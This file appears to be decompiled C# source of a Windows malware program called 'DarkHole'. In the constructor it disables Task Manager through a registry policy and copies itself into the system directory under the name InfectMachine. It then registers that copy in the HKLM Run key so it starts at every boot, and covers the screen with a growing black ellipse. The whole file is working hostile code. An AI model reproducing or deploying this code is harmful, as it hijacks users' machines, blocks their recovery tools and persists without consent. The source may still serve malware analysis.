using System;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace DarkHole;

public class ADarkHole
{
	public struct AElipse
	{
		public int Width;

		public int Height;

		public int Top;

		public int Left;
	}

	public frmMain frmHole;

	public AElipse Elipse;

	public Thread threadProgressiveDarkHole;

	public ADarkHole(ref frmMain frmHl)
	{
		Elipse = default(AElipse);
		threadProgressiveDarkHole = new Thread(MainModule.ProgressiveDarkHole);
		frmHole = frmHl;
		((Control)frmHole).set_Height(Screen.get_PrimaryScreen().get_WorkingArea().Height);
		((Control)frmHole).set_Width(Screen.get_PrimaryScreen().get_WorkingArea().Width);
		((Control)frmHole).set_Top(0);
		((Control)frmHole).set_Left(0);
		checked
		{
			Elipse.Top = (int)Math.Round((double)((Control)frmHole).get_Height() / 2.0);
			Elipse.Left = (int)Math.Round((double)((Control)frmHole).get_Width() / 2.0);
			Elipse.Height = (int)Math.Round((double)((Control)frmHole).get_Height() / 2.0 + 15.0);
			Elipse.Width = (int)Math.Round((double)((Control)frmHole).get_Width() / 2.0 + 15.0);
			TaskmanagerLock(Locked: true);
			InfectMachine();
			DoDarkHole();
			Thread thread = threadProgressiveDarkHole;
			thread.IsBackground = true;
			thread.Priority = ThreadPriority.Normal;
			thread.Start();
			thread = null;
		}
	}

	public void DoDarkHole()
	{
		((Control)frmHole).set_Text(Strings.Space(checked((int)Math.Round((double)((Control)frmHole).get_Width() / 10.0 - (double)"Dark Hole".Length))) + "Dark Hole");
		((Form)frmHole).set_BackColor(Color.Black);
		MainModule.SetWindowRgn(((Control)frmHole).get_Handle().ToInt32(), MainModule.CreateEllipticRgn(Elipse.Left, Elipse.Top, Elipse.Width, Elipse.Height), bRedraw: true);
	}

	public void DoDarkHole(int Top, int Left, int Height, int Width)
	{
		((Control)frmHole).set_Text(Strings.Space(checked((int)Math.Round((double)((Control)frmHole).get_Width() / 10.0 - (double)"Dark Hole".Length))) + "Dark Hole");
		((Form)frmHole).set_BackColor(Color.Black);
		MainModule.SetWindowRgn(((Control)frmHole).get_Handle().ToInt32(), MainModule.CreateEllipticRgn(Left, Top, Width, Height), bRedraw: true);
	}

	public void InfectMachine()
	{
		string text = Environment.SystemDirectory + "\\DarkHole.exe";
		if (!File.Exists(text))
		{
			File.Copy(Application.get_ExecutablePath(), text);
		}
		Registry.LocalMachine.OpenSubKey("SOFTWARE")!.OpenSubKey("Microsoft")!.OpenSubKey("Windows")!.OpenSubKey("CurrentVersion")!.OpenSubKey("run", writable: true)!.SetValue("DarkHole", Environment.SystemDirectory + "\\DarkHole.exe");
	}

	public void TaskmanagerLock(bool Locked)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE")!.OpenSubKey("Microsoft")!.OpenSubKey("Windows")!.OpenSubKey("CurrentVersion")!.OpenSubKey("Policies", writable: true);
		string[] subKeyNames = registryKey.GetSubKeyNames();
		int lowerBound = subKeyNames.GetLowerBound(0);
		int upperBound = subKeyNames.GetUpperBound(0);
		int num = lowerBound;
		while (true)
		{
			if (num <= upperBound)
			{
				if (StringType.StrCmp(subKeyNames[num], "System", false) == 0)
				{
					break;
				}
				num = checked(num + 1);
				continue;
			}
			registryKey.CreateSubKey("System");
			break;
		}
		registryKey.OpenSubKey("System", writable: true)!.SetValue("DisableTaskMgr", 0 - (Locked ? 1 : 0));
	}
}
